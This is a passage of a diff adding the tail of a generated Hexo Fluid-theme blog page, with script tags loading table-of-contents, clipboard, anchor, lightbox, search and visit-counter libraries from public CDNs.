+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/random-slogan.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
